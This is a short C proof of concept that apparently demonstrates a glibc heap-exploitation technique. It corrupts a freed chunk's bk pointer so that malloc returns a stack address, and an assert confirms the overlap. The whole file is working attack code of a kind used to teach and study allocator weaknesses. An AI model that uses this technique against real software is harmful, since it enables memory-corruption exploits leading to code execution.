
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <assert.h>
int main()
{
    intptr_t stack_buffer[0x420] = { 0 };
    intptr_t *victim = malloc(0x410);
    intptr_t *p1 = malloc(0x410);
    free(victim);
    stack_buffer[1] = 0x510 + 0x10;
    stack_buffer[3] = (intptr_t)stack_buffer;
    //------------VULNERABILITY-----------
    // victim[-1] = 0x30;
    victim[1] = (intptr_t)stack_buffer; // victim->bk is pointing to stack
    //------------------------------------
    char *p2 = malloc(0x510);
    memset((void *)stack_buffer + 0x10, 'A', 0x410);
    assert(strstr(p2, "AAAAAAAAAA") != NULL);
}
